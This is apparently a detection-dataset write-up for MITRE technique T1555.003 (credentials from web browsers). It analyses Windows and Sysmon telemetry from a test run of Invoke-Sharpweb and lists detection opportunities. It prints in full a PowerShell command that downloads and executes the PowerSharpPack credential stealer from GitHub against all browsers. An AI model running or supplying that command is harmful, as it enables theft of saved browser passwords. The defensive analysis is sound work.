# T1555.003-13: Credentials from Web Browsers — WinPwn - PowerSharpPack - Sharpweb for Browser Credentials

## Technique Context

MITRE ATT&CK T1555.003 (Credentials from Web Browsers) includes download-and-execute patterns for .NET-based browser credential stealers. SharpWeb is a C# tool that extracts saved credentials from Chrome, Firefox, Opera, and Edge by accessing their respective credential stores. PowerSharpPack is a repository by S3cur3Th1sSh1t that packages compiled .NET offensive tools as PowerShell-invokable binaries. `Invoke-Sharpweb` loads the SharpWeb assembly reflectively from a base64-encoded blob — a technique designed to avoid writing a binary to disk and to bypass signature-based detection on the binary itself.

## What This Dataset Contains

**Command executed (Security 4688 and Sysmon EID=1):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command "all"}
```

**PowerShell 4104 script blocks:**
- Both the `iex ... downloadstring(...)` invocation and `Invoke-Sharpweb -command "all"` captured verbatim. The `-command "all"` flag instructs SharpWeb to target all supported browsers simultaneously.

**Sysmon EID=22 (DNS Query):**
- DNS query for `raw.githubusercontent.com` resolved to GitHub CDN IPs — download request confirmed.

**Sysmon EID=1 (Process Create):**
- `whoami.exe` (T1033) and child `powershell.exe` (T1059.001).

**Sysmon EID=10 (Process Access):**
- Parent PowerShell accessing child process handles — T1055.001 heuristic.

**Exit codes:** All `0x0` — PowerShell completed without error.

## What This Dataset Does Not Contain (and Why)

**Reflective .NET assembly loading:** `Invoke-Sharpweb` loads SharpWeb as a .NET assembly in-memory via `[System.Reflection.Assembly]::Load()`. Sysmon EID=7 (Image Load) would capture CLR/MSIL loading, but the SharpWeb assembly itself would not appear as a named DLL. The 4104 script block logging captures the loader, but the full Invoke-Sharpweb.ps1 script body is absent from the PowerShell log — indicating AMSI intercepted or blocked the downloaded script before it was fully evaluated by PowerShell's script block logger.

**SharpWeb execution output:** No browser credential output appears in any telemetry. AMSI blocked the reflective loader before SharpWeb could access any browser stores.

**EID=3 (Network Connection) for the download:** Unlike test 12, no Sysmon EID=3 appears for the `raw.githubusercontent.com` connection in this dataset. The DNS query (EID=22) confirms the resolution request, but the TCP connection event was not captured — possibly due to Defender intercepting at the AMSI layer before the connection completed, or a timing issue with Sysmon's network filter.

**Difference from tests 11/12:** Tests 11 and 12 use WinPwn.ps1 from the same GitHub URL. Test 13 uses a different repository (`PowerSharpPack`) and a different function (`Invoke-Sharpweb`). The network indicator and AMSI blocking pattern are similar across all three WinPwn/PowerSharpPack tests.

## Assessment

The PowerSharpPack/Invoke-Sharpweb execution was blocked before any credential access occurred. The dataset's primary value is the script block capturing the `iex ... Invoke-Sharpweb.ps1` download pattern, the `-command "all"` parameter showing multi-browser targeting intent, and the DNS query confirming the external download. The reflective loading technique used by Invoke-Sharpweb is specifically designed to evade disk-based AV scanning — AMSI's interception in memory is the control that stopped this.

## Detection Opportunities Present in This Data

- **PowerShell 4104** contains `iex(new-object net.webclient).downloadstring(...)` with the PowerSharpPack URL — and `Invoke-Sharpweb -command "all"` in the same execution context. Either string alone warrants alert; together they are definitive.
- **Sysmon EID=22 (DNS)** for `raw.githubusercontent.com` from SYSTEM-context PowerShell remains a behavioral indicator.
- The GitHub URL `raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1` is a threat intelligence indicator; monitoring for this specific path provides detection for this test variant.
- **Security 4688** captures the `Invoke-Sharpweb` command line without requiring script block logging.
- AMSI-focused detection: absence of the full `Invoke-Sharpweb.ps1` content in 4104 logs despite a DNS query to GitHub is a behavioral tell that AMSI may have blocked the download — an evasion attempt indicator.
- Correlation: `new-object net.webclient` in 4104 + DNS to `raw.githubusercontent.com` + `Invoke-` prefix in the same block = high-confidence PowerShell-based offensive tool download.
